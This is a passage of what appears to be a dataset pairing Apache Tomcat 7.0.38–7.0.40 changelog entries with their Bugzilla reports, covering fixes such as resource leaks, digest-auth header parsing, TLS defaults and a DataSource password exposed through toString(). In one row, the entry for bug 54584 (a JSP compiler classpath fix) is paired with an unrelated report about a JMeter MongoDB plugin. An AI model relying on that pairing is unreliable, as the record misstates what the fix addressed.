    // [1] I think ""delegate = null"" is done too soon
    delegate = null;
    if (shouldClose) {
        // check its body below
        super.closeInvoked();
    }
}

// This is super.closeInvoked()
public void closeInvoked() {
    if (getDelegate()!=null) {
        // never true when coming from
        // StatementCache#closeInvoked()
        // because of [1]
        try {
            getDelegate().close();
        }catch (SQLException ignore) {
        }
    }
    closed = true;
    delegate = null;
}

To test this, step into org.apache.tomcat.jdbc.test.TestStatementCache tests testPreparedStatementCache and testPreparedStatementCache2. The calls to Statement.close() are intercepted but never forwarded to the actual Statement. Perhaps some kind of mock could be used to make sure Statement.close() is called on each created Statement."|https://bz.apache.org/bugzilla/show_bug.cgi?id=54732
jdbc-pool|Tomcat 7.0.40 (markt)|fix||Fix NPE in SlowQueryReportJmx when running TestSlowQueryReport test. (kkolinko)|||
Other|Tomcat 7.0.40 (markt)|update||Update to Eclipse JDT Compiler 4.2.2. (kkolinko)|||
Other|Tomcat 7.0.40 (markt)|update|54890|Update to Apache Commons Daemon 1.0.15. (mturk)|Change commons-daemon dependency from 1.0.14 to 1.0.15|"Several users, myself included, reported problems when running jsvc from Tomcat 7.0.39, due to DAEMON-291.

If there is no other obstacles, please change commons-daemon dependency from 1.0.14 to 1.0.15.

-Ognjen"|https://bz.apache.org/bugzilla/show_bug.cgi?id=54890
Other|Tomcat 7.0.40 (markt)|update||Convert remaining unit tests to JUnit 4 and enable Checkstyle rule that forbids use of methods from JUnit 3. (markt/kkolinko)|||
Other|Tomcat 7.0.40 (markt)|fix||Remove unneeded permissions for reading UserDataHelper properties from catalina.policy file. The class that needed those was moved in 7.0.26. (kkolinko)|||
Catalina|Tomcat 7.0.39 (markt)|fix||Ensure a log message is generated when a web application fails to start due to an error processing a ServletContainerInitializer. (markt)|||
Catalina|Tomcat 7.0.39 (markt)|fix||Prevent NPE in JAR scanning when running in an environment where the bootstrap class loader is not an ancestor of the web application class loader such as OSGi environments. (violetagg)|||
Catalina|Tomcat 7.0.39 (markt)|fix||Ensure that, if a call to UEncoder#encodeURL is made, all internal structures are properly cleaned. (violetagg)|||
Catalina|Tomcat 7.0.39 (markt)|add|54660|Enable the modification of an access log's fileDateFormat attribute while the access log is in use. The change will take effect when the next entry is made to the access log. (markt)|AccessLogValve fileDateFormat can not be changed through JMX|"When an AccessLogValve is added to a catalina host with the JMX addVale() operation on the Host object name, the valve will start with the default fileDateFormat.

Changing the attribute on the valve through it's JMX object name has no effect because the valve is already started.

Executing a rotate() operation on the valve does also have no effect.

Steps to Reproduce:
- Start tomcat server
- Add Host using JMX
- Add valve to Host using JMX
- Set valve attribute fileDateFormat to something else than yyyy-MM-dd, for example yy-MM

Actual Results:
The access log file format will include the default fileDateFormat of yyyy-MM-dd

Expected Results:
The access log file format with yy-MM, as from the example."|https://bz.apache.org/bugzilla/show_bug.cgi?id=54660
Catalina|Tomcat 7.0.39 (markt)|update||Update Tomcat's internal copy of Commons FileUpload to FileUpload trunk, revision 1458500 and the associated extract from Commons IO to 2.4. (markt)|||
Catalina|Tomcat 7.0.39 (markt)|fix|54702|Prevent file descriptors leak and ensure that files are closed when parsing web application deployment descriptors. (violetagg)|File descriptor leak at web.xml loading|"Hello

I think I've found a file descriptor leak in file /tomcat/trunk/java/org/apache/catalina/startup/ContextConfig.java (method getGlobalWebXmlSource).

A stream is from file ""web.xml"" is not closed.

private WebXml getDefaultWebXmlFragment() {
... 

1284	        InputSource globalWebXml = getGlobalWebXmlSource();
...
1337	            // Parse global web.xml if present
1338	            if (globalWebXml == null) {
1339	                // This is unusual enough to log
1340	                log.info(sm.getString(""contextConfig.defaultMissing""));
1341	            } else {
1342	                parseWebXml(globalWebXml, webXmlDefaultFragment, false);
1343	            }

Here is the full stack trace

[java.io.FileInputStream.<init>(FileInputStream.java:109)] [org.apache.catalina.startup.ContextConfig.getWebXmlSource(ContextConfig.java:1837)] [org.apache.catalina.startup.ContextConfig.getGlobalWebXmlSource(ContextConfig.java:1744)] [org.apache.catalina.startup.ContextConfig.getDefaultWebXmlFragment(ContextConfig.java:1417)] [org.apache.catalina.startup.ContextConfig.webConfig(ContextConfig.java:1253)] [org.apache.catalina.startup.ContextConfig.configureStart(ContextConfig.java:878)] [org.apache.catalina.startup.ContextConfig.lifecycleEvent(ContextConfig.java:369)] [org.apache.catalina.util.LifecycleSupport.fireLifecycleEvent(LifecycleSupport.java:119)] [org.apache.catalina.util.LifecycleBase.fireLifecycleEvent(LifecycleBase.java:90)] [org.apache.catalina.core.StandardContext.startInternal(StandardContext.java:5173)] [org.apache.catalina.util.LifecycleBase.start(LifecycleBase.java:150)] [org.apache.catalina.core.ContainerBase.addChildInternal(ContainerBase.java:901)] [org.apache.catalina.core.ContainerBase.addChild(ContainerBase.java:877)] [org.apache.catalina.core.StandardHost.addChild(StandardHost.java:633)] [org.apache.catalina.startup.HostConfig.deployWAR(HostConfig.java:977)] [org.apache.catalina.startup.HostConfig.deployApps(HostConfig.java:542)] [org.apache.catalina.startup.HostConfig.check(HostConfig.java:1462)] [sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method)] [sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:39)] [sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:25)] [java.lang.reflect.Method.invoke(Method.java:597)] [org.apache.tomcat.util.modeler.BaseModelMBean.invoke(BaseModelMBean.java:301)] [com.sun.jmx.interceptor.DefaultMBeanServerInterceptor.invoke(DefaultMBeanServerInterceptor.java:836)] [com.sun.jmx.mbeanserver.JmxMBeanServer.invoke(JmxMBeanServer.java:761)] [org.apache.catalina.manager.ManagerServlet.check(ManagerServlet.java:1445)] [org.apache.catalina.manager.HTMLManagerServlet.upload(HTMLManagerServlet.java:301)] [org.apache.catalina.manager.HTMLManagerServlet.doPost(HTMLManagerServlet.java:208)] [javax.servlet.http.HttpServlet.service(HttpServlet.java:647)] [javax.servlet.http.HttpServlet.service(HttpServlet.java:728)] [org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:305)] [org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:210)] [org.apache.catalina.filters.CsrfPreventionFilter.doFilter(CsrfPreventionFilter.java:213)] [org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:243)] [org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:210)] [org.apache.catalina.filters.SetCharacterEncodingFilter.doFilter(SetCharacterEncodingFilter.java:108)] [org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:243)] [org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:210)] [org.apache.catalina.core.StandardWrapperValve.invoke(StandardWrapperValve.java:222)] [org.apache.catalina.core.StandardContextValve.invoke(StandardContextValve.java:123)] [org.apache.catalina.authenticator.AuthenticatorBase.invoke(AuthenticatorBase.java:581)] [org.apache.catalina.core.StandardHostValve.invoke(StandardHostValve.java:171)] [org.apache.catalina.valves.ErrorReportValve.invoke(ErrorReportValve.java:99)] [org.apache.catalina.valves.AccessLogValve.invoke(AccessLogValve.java:931)] [org.apache.catalina.core.StandardEngineValve.invoke(StandardEngineValve.java:118)] [org.apache.catalina.connector.CoyoteAdapter.service(CoyoteAdapter.java:407)] [org.apache.coyote.http11.AbstractHttp11Processor.process(AbstractHttp11Processor.java:1004)] [org.apache.coyote.AbstractProtocol$AbstractConnectionHandler.process(AbstractProtocol.java:589)] [org.apache.tomcat.util.net.AprEndpoint$SocketProcessor.run(AprEndpoint.java:1822)] [java.util.concurrent.ThreadPoolExecutor$Worker.runTask(ThreadPoolExecutor.java:886)] [java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:908)] [java.lang.Thread.run(Thread.java:662)]"|https://bz.apache.org/bugzilla/show_bug.cgi?id=54702
Catalina|Tomcat 7.0.39 (markt)|fix|54707|Further relax the parsing of DIGEST authentication headers to allow for buggy clients that quote values that RFC2617 states should not be quoted. (markt/kkolinko)|"Buggy Perl http clients cause tomcat digest auth to fail due to quoted nc values (e.g. nc=""00000001"")"|"This problem was discovered while trying to make the Perl LWP library work with tomcat where a path was being protected with digest authentication. 

Ultimately, this is a bug with Perl (see https://rt.cpan.org/Public/Bug/Display.html?id=43354), and it has been possibly fixed. 
HOWEVER, this requires users to update their perl libraries etc (a big pain for our customers and for us).

A simple fix to tomcat would solve this problem for us and make life good again.

A typical digest response header from perl looks like:

Authorization: Digest username=""joe"", realm=""ACME"", qop=""auth"", algorithm=""MD5"", uri=""/my/protected/path"", nonce=""1363130363664:71e75a43d7fdbfff8c54bece373058b8"", nc=""00000001"", cnonce=""513fb7fb"", response=""baeeff0b6b9b7e74e769630160d3725b"", message-digest=""d41d8cd98f00b204e9800998ecf8427e"", opaque=""9C2C62C52D30A7D5707F75F5A813F113""

The entry nc=""00000001"" causes tomcat to reject the request.  It should be nc=00000001 (the perl client's mistake)

The following perl script demonstrates the problem:

#!/usr/bin/perl
use strict;
use LWP;

&doGet(""myname"", ""mypassword"", ""myrealmname"", ""myhost"", ""8080"", ""/my/protected/path"");

sub doGet
{
    my ($username, $password, $realm, $host, $port, $uri) = @_;
    my $url = ""http://"".$host."":"".$port.$uri;

    print ""GET: $url\n"";

    my $browser = LWP::UserAgent->new;

    $browser->agent('Debug Digest Problem');
    $browser->credentials($host."":"".$port,$realm,$username=>$password);

    my $response=$browser->get($url);

    print ""HTTP STATUS:"".$response->status_line.""\n"";
    print $response->content;
}

The fix should be in org.apache.tomcat.util.http.parser.HttpParser.java

Looking at build 7.0.37 code:

Around line 147:
                case 3:
                    // FIELD_TYPE_LHEX
                    value = readLhex(input);
                    break;

This switch is hit when the field is 'nc' (due to line 72 fieldTypes.put(""nc"", FIELD_TYPE_LHEX); ]

The method readLhex() does not tolerant quotes. (see line 434 and below).

A similar tomcat issue was fixed a while back for the quoted qop field. (the qop response field should also not be quoted, but tomcat handles this).

Also see line 375
     * This is not defined in any RFC. It is a special case to handle data from
     * buggy clients (known buggy clients include Microsoft IE 8 & 9, Apple
     * Safari for OSX and iOS) that add quotes to values that should be tokens.

Server software which tolerates this mistake in the perl client includes Apache and Spring's security filter 
(org.springframework.security.web.authentication.www.DigestAuthenticationFilter)."|https://bz.apache.org/bugzilla/show_bug.cgi?id=54707
Catalina|Tomcat 7.0.39 (markt)|fix||Enable support for MBeans with multiple operations with the same name but different signatures. (markt)|||
Catalina|Tomcat 7.0.39 (markt)|code||Deprecate Tomcat's internal Base 64 encoder/decoder and switch to using a package renamed copy of the Commons Codec implementation. (markt)|||
Catalina|Tomcat 7.0.39 (markt)|fix||Ensure that StandardJarScanner#scan will use the provided class loader when scanning the class loader hierarchy. (violetagg)|||
Coyote|Tomcat 7.0.39 (markt)|fix|54690|Fix a regression caused by the previous fix for 54406. If no values are specified for sslEnabledProtocols or ciphers use the default values for server sockets rather than the default values for client sockets. (markt)|HTTPS BIO/NIO connector does not enable TLS 1.1 and TLS 1.2 by default|"As users already noted [1], default HTTPS BIO/NIO connector in Tomcat 7.0.37 enables only SSLv3 and TLSv1, while Tomcat 6.0.36 enables SSLv3, TLSv1, TLSv1.1 and TLSv1.2.

The reason for this change of behavior is that:

1. Tomcat 6, with default HTTPS connector configuration, does not call socket.setEnabledProtocols, thus enabling SSLv3, TLSv1, TLSv1.1 and TLSv1.2, while

2. Tomcat 7, with default HTTPS connector configuration, calls socket.setEnabledProtocols(enabledProtocols), where enabledProtocols is obtained with: context.getDefaultSSLParameters().getProtocols(). This, contrary to not calling setEnabledProtocols at all, results in enabling only SSLv3 and TLSv1.


I propose that Tomcat 7 mimics Tomcat 6 behavior, and if attribute sslEnabledProtocols (in HTTPS connector in server.xml) is not set, then method socket.setEnabledProtocols is not invoked.

Everything is tested with Oracle JDK 1.7.0_15.

More details on post on Tomcat dev list [2].

[1] https://twitter.com/ivanristic/status/303798231920431104
[2] http://www.mail-archive.com/dev@tomcat.apache.org/msg71522.html"|https://bz.apache.org/bugzilla/show_bug.cgi?id=54690
Web applications|Tomcat 7.0.39 (markt)|update||Correct Deployer, Manager and Context pages of Tomcat documentation. (kkolinko)|||
jdbc-pool|Tomcat 7.0.39 (markt)|fix|52318|Version for imported package org.apache.juli.logging is extended to include also 7.0.x versions. The fix is applicable only when running in OSGi environment. Patch provided by Martin Lichtin. (violetagg)|Version in tomcat-jdbc POM is conflicted with Version in MANIFEST for JULI JAR|"<groupId>org.apache.tomcat</groupId>
<artifactId>tomcat-jdbc</artifactId>
<version>7.0.22</version>

has dependenca to apache-juli

MANIFEST:
org.apache.juli.logging;version=""[6.0.18, 7.0.0)""

BUT in POM:
    <dependency>
      <groupId>org.apache.tomcat</groupId>
      <artifactId>tomcat-juli</artifactId>
      <version>7.0.22</version>
      <scope>compile</scope>
    </dependency>

WHY????????"|https://bz.apache.org/bugzilla/show_bug.cgi?id=52318
jdbc-pool|Tomcat 7.0.39 (markt)|fix|54599|Do not print connection password in PoolProperties.toString(). Based on a patch by Daniel Mikusa. (kkolinko)|DataSource password is exposed to applications via toString method|"On the server side, create a DataSource using ""org.apache.tomcat.jdbc.pool.DataSourceFactory"".

Ex:

        <Resource auth=""Container""
                  description=""""
                  name=""jdbc/testTomcatJdbc""
                  factory=""org.apache.tomcat.jdbc.pool.DataSourceFactory""
                  type=""javax.sql.DataSource""
                  username=""sa""
                  password=""super-secret""
                  driverClassName=""org.h2.Driver""
                  url=""jdbc:h2:mem:test""
                  minIdle=""1""
                  initialSize=""1"" />

In a web application, create a JSP file, add the following:

<%@ page import=""javax.naming.*"" session=""false"" %>
<!DOCTYPE HTML>
<html>

<head>
    <title>Display Password!</title>
</head>
<body>
    <h1>toString for Tomcat JDBC</h1>
    <%
      dataSource = (javax.sql.DataSource) ctx.lookup(""java:/comp/env/jdbc/testTomcatJdbc"");
      out.println(""<p>"" + dataSource.toString() + ""</p>"");
    %>
</body>
</html>

Access the JSP in your browser.  The output from toString on the DataSource will display the password that was configured in the <Resource/> tag.

Example Output:

toString for Tomcat JDBC

org.apache.tomcat.jdbc.pool.DataSource@75cae120{ConnectionPool[defaultAutoCommit=null; defaultReadOnly=null; defaultTransactionIsolation=-1; defaultCatalog=null; driverClassName=org.h2.Driver; maxActive=100; maxIdle=100; minIdle=1; initialSize=1; maxWait=30000; testOnBorrow=false; testOnReturn=false; timeBetweenEvictionRunsMillis=5000; numTestsPerEvictionRun=0; minEvictableIdleTimeMillis=60000; testWhileIdle=false; testOnConnect=false; password=super-secret; url=jdbc:h2:mem:test; username=sa; validationQuery=null; validatorClassName=null; validationInterval=30000; accessToUnderlyingConnectionAllowed=true; removeAbandoned=false; removeAbandonedTimeout=60; logAbandoned=false; connectionProperties=null; initSQL=null; jdbcInterceptors=null; jmxEnabled=true; fairQueue=true; useEquals=true; abandonWhenPercentageFull=0; maxAge=0; useLock=false; dataSource=null; dataSourceJNDI=null; suspectTimeout=0; alternateUsernameAllowed=false; commitOnReturn=false; rollbackOnReturn=false; useDisposableConnectionFacade=true; logValidationErrors=false; propagateInterruptState=false; }"|https://bz.apache.org/bugzilla/show_bug.cgi?id=54599
jdbc-pool|Tomcat 7.0.39 (markt)|fix|54684|Add javax.naming.spi to Import-Package header in MANIFEST.MF in order to resolve ClassNotFoundException when running in OSGi environment. (violetagg)|PoolProperties.toString() causes NoClassDefFoundError exception|"When turning on DEBUG logging, toString() causes the following exception.
It happens in an OSGi environment.

SLF4J: Failed toString() invocation on an object of type [org.apache.tomcat.jdbc.pool.DataSource]
2013-03-12 14:17:13,612 | DEBUG | Blueprint Extender: 1    | ServiceRecipe                    | lueprint.container.ServiceRecipe  276 | 7 - org.apache.aries.blueprint.core - 1.1.0 | Creating service instance
java.lang.NoClassDefFoundError: javax/naming/spi/ObjectFactory
    at java.lang.ClassLoader.defineClass1(Native Method)
    at java.lang.ClassLoader.defineClass(ClassLoader.java:791)
    at org.apache.felix.framework.BundleWiringImpl$BundleClassLoader.findClass(BundleWiringImpl.java:2128)
    at org.apache.felix.framework.BundleWiringImpl.findClassOrResourceByDelegation(BundleWiringImpl.java:1432)
    at org.apache.felix.framework.BundleWiringImpl.access$400(BundleWiringImpl.java:72)
    at org.apache.felix.framework.BundleWiringImpl$BundleClassLoader.loadClass(BundleWiringImpl.java:1843)
    at java.lang.ClassLoader.loadClass(ClassLoader.java:356)
    at org.apache.tomcat.jdbc.pool.PoolProperties.toString(PoolProperties.java:804)
    at java.lang.String.valueOf(String.java:2854)
    at java.lang.StringBuilder.append(StringBuilder.java:128)
    at org.apache.tomcat.jdbc.pool.DataSourceProxy.toString(DataSourceProxy.java:215)
    at org.slf4j.helpers.MessageFormatter.safeObjectAppend(MessageFormatter.java:304)
    at org.slf4j.helpers.MessageFormatter.deeplyAppendParameter(MessageFormatter.java:276)
    at org.slf4j.helpers.MessageFormatter.arrayFormat(MessageFormatter.java:230)
    at org.slf4j.helpers.MessageFormatter.format(MessageFormatter.java:124)
    at org.ops4j.pax.logging.slf4j.Slf4jLogger.debug(Slf4jLogger.java:280)
    at org.apache.aries.blueprint.container.ServiceRecipe.createService(ServiceRecipe.java:302)
    at org.apache.aries.blueprint.container.ServiceRecipe.internalGetService(ServiceRecipe.java:249)
    at org.apache.aries.blueprint.container.ServiceRecipe.internalCreate(ServiceRecipe.java:146)
    at org.apache.aries.blueprint.di.AbstractRecipe$1.call(AbstractRecipe.java:79)
    at java.util.concurrent.FutureTask$Sync.innerRun(FutureTask.java:334)
    at java.util.concurrent.FutureTask.run(FutureTask.java:166)
    at org.apache.aries.blueprint.di.AbstractRecipe.create(AbstractRecipe.java:88)
    at org.apache.aries.blueprint.container.BlueprintRepository.createInstances(BlueprintRepository.java:245)
    at org.apache.aries.blueprint.container.BlueprintRepository.createAll(BlueprintRepository.java:183)
    at org.apache.aries.blueprint.container.BlueprintContainerImpl.instantiateEagerComponents(BlueprintContainerImpl.java:668)
    at org.apache.aries.blueprint.container.BlueprintContainerImpl.doRun(BlueprintContainerImpl.java:370)
    at org.apache.aries.blueprint.container.BlueprintContainerImpl.run(BlueprintContainerImpl.java:261)
    at java.util.concurrent.Executors$RunnableAdapter.call(Executors.java:471)
    at java.util.concurrent.FutureTask$Sync.innerRun(FutureTask.java:334)
    at java.util.concurrent.FutureTask.run(FutureTask.java:166)
    at org.apache.aries.blueprint.container.ExecutorServiceWrapper.run(ExecutorServiceWrapper.java:106)
    at org.apache.aries.blueprint.utils.threading.impl.DiscardableRunnable.run(DiscardableRunnable.java:48)
    at java.util.concurrent.Executors$RunnableAdapter.call(Executors.java:471)
    at java.util.concurrent.FutureTask$Sync.innerRun(FutureTask.java:334)
    at java.util.concurrent.FutureTask.run(FutureTask.java:166)
    at java.util.concurrent.ScheduledThreadPoolExecutor$ScheduledFutureTask.access$201(ScheduledThreadPoolExecutor.java:178)
    at java.util.concurrent.ScheduledThreadPoolExecutor$ScheduledFutureTask.run(ScheduledThreadPoolExecutor.java:292)
    at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1145)
    at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:615)
    at java.lang.Thread.run(Thread.java:722)
Caused by: java.lang.ClassNotFoundException: javax.naming.spi.ObjectFactory not found by org.apache.tomcat.jdbc [165]
    at org.apache.felix.framework.BundleWiringImpl.findClassOrResourceByDelegation(BundleWiringImpl.java:1460)
    at org.apache.felix.framework.BundleWiringImpl.access$400(BundleWiringImpl.java:72)
    at org.apache.felix.framework.BundleWiringImpl$BundleClassLoader.loadClass(BundleWiringImpl.java:1843)
    at java.lang.ClassLoader.loadClass(ClassLoader.java:356)
    ... 41 more"|https://bz.apache.org/bugzilla/show_bug.cgi?id=54684
Other|Tomcat 7.0.39 (markt)|fix||Update to Apache Commons Daemon 1.0.14 to resolve 54609 which meant that installation of Windows service could fail producing incorrect service launch command. (mturk)|Running service install on 7.0.37 on Windows 2008 adds unexpected characters to service executable path|"Created attachment 29991 [details]
Comparing 7.0.35 to 7.0.37

Please see the attached screenshot for a comparison of service install between versions 7.0.35 and 7.0.37.

Performed the following steps:
1. Downloaded tomcat 7.0.35 and tomcat 7.0.37 onto a Windows Server 2008 VM.
2. Extracted to different directories
3. In two different command prompt windows, ran ""tomcat7.exe //IS//tomcat.<version>.test""
4. Opened service properties and checked executable path.

Tomcat 7.0.35 path:
""C:\Tomcat Test\apache-tomcat-7.0.35-windows-x64\apache-tomcat-7.0.35\bin\tomcat7.exe"" //RS//tomcat7.0.35.test

Tomcat 7.0.37 path:
""C:\Tomcat Test\apache-tomcat-7.0.37-windows-x64\apache-tomcat-7.0.37\bin\tomcat7.exe"" 02-25.lot//RS//tomcat7.0.37.test

Please notice the ""02-25.lot"" in the 7.0.37 path, also visible in the screenshot."|https://bz.apache.org/bugzilla/show_bug.cgi?id=54609
Other|Tomcat 7.0.39 (markt)|fix||Ensure HEAD requests return the correct content length when the requested resource uses a Writer. Patch by Nick Williams. (markt)|||
Catalina|Tomcat 7.0.38 (markt)|fix||Ensure that the request start time (used by the access log valve to calculate request processing time) is correctly recorded for the HTTP NIO connector. In some cases the request processing time may have been longer than that recorded. (markt)|||
Catalina|Tomcat 7.0.38 (markt)|update||Add one more library from JDK 7 to the value of jarsToSkip property in the catalina.properties file. (kkolinko)|||
Catalina|Tomcat 7.0.38 (markt)|add|53871|If annotation scanning results in a StackOverflowError due to broken class dependencies, add the class hierarchy that triggered the exception to the error message. (markt)|java.lang.StackOverflowError on deploying a web application|"When starting Tomcat 7.0.29 and 7.0.30, and automatically deploying a war file from webapps the following error is thrown:
14:01:06,380 ERROR [HostConfig:576] Error waiting for multi-thread deployment of context descriptors to complete java.util.concurrent.ExecutionException: java.lang.StackOverflowError
    at java.util.concurrent.FutureTask$Sync.innerGet(FutureTask.java:252)
    at java.util.concurrent.FutureTask.get(FutureTask.java:111)
    at org.apache.catalina.startup.HostConfig.deployDescriptors(HostConfig.java:574)
    at org.apache.catalina.startup.HostConfig.deployApps(HostConfig.java:470)
    at org.apache.catalina.startup.HostConfig.start(HostConfig.java:1413)
    at org.apache.catalina.startup.HostConfig.lifecycleEvent(HostConfig.java:313)
    at org.apache.catalina.util.LifecycleSupport.fireLifecycleEvent(LifecycleSupport.java:119)
    at org.apache.catalina.util.LifecycleBase.fireLifecycleEvent(LifecycleBase.java:90)
    at org.apache.catalina.util.LifecycleBase.setStateInternal(LifecycleBase.java:401)
    at org.apache.catalina.util.LifecycleBase.setState(LifecycleBase.java:346)
    at org.apache.catalina.core.ContainerBase.startInternal(ContainerBase.java:1140)
    at org.apache.catalina.core.StandardHost.startInternal(StandardHost.java:785)
    at org.apache.catalina.util.LifecycleBase.start(LifecycleBase.java:150)
    at org.apache.catalina.core.ContainerBase$StartChild.call(ContainerBase.java:1559)
    at org.apache.catalina.core.ContainerBase$StartChild.call(ContainerBase.java:1549)
    at java.util.concurrent.FutureTask$Sync.innerRun(FutureTask.java:334)
    at java.util.concurrent.FutureTask.run(FutureTask.java:166)
    at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1110)
    at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:603)
    at java.lang.Thread.run(Thread.java:722)

Caused by: java.lang.StackOverflowError at java.util.HashSet.(HashSet.java:103) at org.apache.catalina.startup.ContextConfig.populateSCIsForCacheEntry(ContextConfig.java:2243) at org.apache.catalina.startup.ContextConfig.populateSCIsForCacheEntry(ContextConfig.java:2260) at org.apache.catalina.startup.ContextConfig.populateSCIsForCacheEntry(ContextConfig.java:2260)
...(and many more identical lines)...

However this works fine in 7.0.28."|https://bz.apache.org/bugzilla/show_bug.cgi?id=53871
Catalina|Tomcat 7.0.38 (markt)|add||Add a new option to the standard JarScanner implementation (scanBootstrapClassPath) to control if the bootstrap classpath is scanned or not. By default, it will not be scanned. (markt)|||
Catalina|Tomcat 7.0.38 (markt)|update||Provide more consolidated servlet MBean data in the webapp MBean. (rjung)|||
Catalina|Tomcat 7.0.38 (markt)|fix|54584|Take account of the delegate attribute when building the web application class path to pass to the JSP compiler. (markt)|MongoDB plugin|"Please find attached a zip of the source for a mongodb plugin.  I use it for comparing the relative performances of mongo scripts.

I'm happy to share it/contribute back into the great work that many folks have executed over the years.

I was told to checkout jmeter eclipse, add the code and team>create patch but I'm a ubuntu / intellij user so the other suggestion was to send it as a zip.

The attached source is also available here:
https://github.com/JanPaulEttles/mongometer

Let me know if you can use it or if you think it's pants and needs work."|https://bz.apache.org/bugzilla/show_bug.cgi?id=54584
Catalina|Tomcat 7.0.38 (markt)|fix||Copy the updated and re-packaged UTF-8 decoder from Tomcat 8.0.x and use this improved decoder for WebSocket connections. Remove the WebSocket specific UTF-8 decoder. (markt)|||
Catalina|Tomcat 7.0.38 (markt)|fix|54602|Recycle the byte to character converter used for URIs between requests to ensure an error in one request does not trigger a failure in the next request. (markt)|B2CConverter character decode underflow leaves bytes in buffer|"If a request contains a uri that ends in a multi byte character which is missing a byte the extra bytes are left in a buffer which is reused by a future request.

The problem comes from two different things:
1) If B2CConverter tries to convert a ByteChunk which ends in a character underflow it does not convert that last character and it is left in a buffer in B2CConver.

2) The B2CConverter in org.apache.catalina.connector.Request is not recycled with the rest of the objects. It looks like this is done intentionally based on the comment above it's declaration.

The issue with B2CConverter can be demonstrated with the code below, which is a simplification of what is done inside of CoyoteAdapter.convertURI():

<code>
B2CConverter conv = new B2CConverter(""UTF-8"");
ByteChunk bc = new ByteChunk();
CharChunk cc = new CharChunk();
byte[] bytes = { 0x61, 0x62, 0x63, 0x64, -8, -69, -73, -77 };

bc.append(bytes, 0, bytes.length);
cc.allocate(bc.getLength(), -1);
conv.convert(bc, cc, cc.getBuffer().length - cc.getEnd());
System.out.println(cc);

cc.recycle();
bc.recycle();

bc.append(bytes, 0, bytes.length);
cc.allocate(bc.getLength(), -1);
conv.convert(bc, cc, cc.getBuffer().length - cc.getEnd());
System.out.println(cc);
</code>

If the B2CConverter was recycled with everything else in Request this would prevent a previous request from corrupting the next request but it doesn't fix the issue that a character is dropped from the initial decode.

I tried playing with B2CConverter and the only way I could get the convert to get everything was by ignoring the limit argument and reading to the end of the stream. It looks like tomcat8 is moving in this direction with the move to NIO, however I tried playing with the latest B2CConverter and was still seeing issues with the given byte sequence."|https://bz.apache.org/bugzilla/show_bug.cgi?id=54602
Catalina|Tomcat 7.0.38 (markt)|fix||Use the newly added improved UTF-8 decoder for decoding UTF-8 encoded URIs and UTF-8 encoded request bodies. Invalid UTF-8 URIs will not cause an error but will make use of the replacement character when an error is detected. This will allow web applications to handle the URI which will most likely result in a 404 response. The fall-back to decoding with ISO-8859-1 if UTF-8 decoding fails has been removed. Invalid UTF-8 sequences in a request body will trigger an IOException. The way the decoder is used has also been improved. The notable change is that invalid sequences at the end of the input now trigger an error rather than being silently swallowed. (markt)|||
Catalina|Tomcat 7.0.38 (markt)|fix|54624|Ensure that the correct request body length is used when swallowing a request body after FORM authentication prior to restoring the original request preventing possible hanging when restoring POST requests submitted over AJP. (markt)|Form authenticator hangs on re-authentication of POST request behind mod_proxy_ajp|"Setup: Tomcat AJP connector behind mod_proxy_ajp, form-based authentication.

When session expires and a POST request is submitted, Tomcat shows login form, user logs in, authenticator tries to restore the original POST request. Doing that, it tries to swallow the AJP message body before replacing the body of the request with the original POST request body. It tries to read the first 4 bytes of the AJP message (the message length) and blocks forever waiting for those 4 bytes."|https://bz.apache.org/bugzilla/show_bug.cgi?id=54624
Catalina|Tomcat 7.0.38 (markt)|fix|54628|When writing binary WebSocket messages write from start position in array rather than the start of the array. Patch provided by blee. (markt)|there is something wrong when send binary data by websocket.|"there is something wrong when send binary data by websocket.

see org.apache.catalina.websocket.WsOutbound.doWriteBytes(ByteBuffer, boolean)

I think 

// Write the content
        upgradeOutbound.write(buffer.array(), 0, buffer.limit());
        upgradeOutbound.flush();

should change to :

// Write the content
        upgradeOutbound.write(buffer.array(), buffer.arrayOffset(), buffer.limit());
        upgradeOutbound.flush();


For example:
byte[] bts = new byte[]{1,2,3,4,5}
ByteBuffer bf = ByteBuffer.wrap(bts, 2, 2);
out.writeBinaryMessage(bf);

I mean write [3,4] to the client, but in fact [1,2,3,4] be sent;"|https://bz.apache.org/bugzilla/show_bug.cgi?id=54628
Coyote|Tomcat 7.0.38 (markt)|code||Refactor char encoding/decoding using NIO APIs. (remm)|||
Web applications|Tomcat 7.0.38 (markt)|fix|54203|Complete the Javadoc for javax.servlet.http.Part. (markt)|Part class missing documentation|The Part class, at https://tomcat.apache.org/tomcat-7.0-doc/servletapi/javax/servlet/http/Part.html lacks any documentation of its methods.|https://bz.apache.org/bugzilla/show_bug.cgi?id=54203
Web applications|Tomcat 7.0.38 (markt)|fix|54638|"Fix display of ""Used"" memory value for memory pools on the status page in Manager web application when the page is rendered as XML. (kkolinko)"|/manager/status?XML=true|"Hi all,
in /manager/status?XML=true, informations about memory pools are incorrect.
for every row all the values (initial,committed,maximum,used) are the same:

Memory Pools
Name:Eden Space	Type:Heap memory	Initial:143130624	Committed:143130624	Maximum:143130624	Used:143130624
Name:Survivor Space	Type:Heap memory	Initial:17891328	Committed:17891328	Maximum:17891328	Used:17891328
Name:Tenured Gen	Type:Heap memory	Initial:357957632	Committed:357957632	Maximum:357957632	Used:357957632
Name:Code Cache	Type:Non-heap memory	Initial:163840	Committed:8421376	Maximum:33554432	Used:163840
Name:Perm Gen	Type:Non-heap memory	Initial:12582912	Committed:23330816	Maximum:67108864	Used:12582912
Name:Perm Gen [shared-ro]	Type:Non-heap memory	Initial:10485760	Committed:10485760	Maximum:10485760	Used:10485760
